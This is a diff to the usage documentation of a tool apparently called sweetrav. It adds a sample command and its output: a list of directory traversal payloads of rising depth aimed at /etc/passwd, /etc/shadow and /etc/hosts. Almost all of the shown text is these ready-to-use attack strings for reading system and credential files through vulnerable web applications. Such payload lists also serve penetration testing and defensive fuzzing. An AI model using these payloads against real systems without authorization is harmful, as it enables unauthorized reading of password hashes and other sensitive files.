@@ -29,3 +29,25 @@ options:
   -i                    Use stdin pipe.
 
 ```
+
+```
+PS C:\sweetrav> python sweetrav.py -r 5-10 -A files.txt
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+../../../../../etc/shadow
+../../../../../../etc/shadow
+../../../../../../../etc/shadow
+../../../../../../../../etc/shadow
+../../../../../../../../../etc/shadow
+../../../../../../../../../../etc/shadow
+../../../../../etc/hosts
+../../../../../../etc/hosts
+../../../../../../../etc/hosts
+../../../../../../../../etc/hosts
+../../../../../../../../../etc/hosts
+../../../../../../../../../../etc/hosts
+```
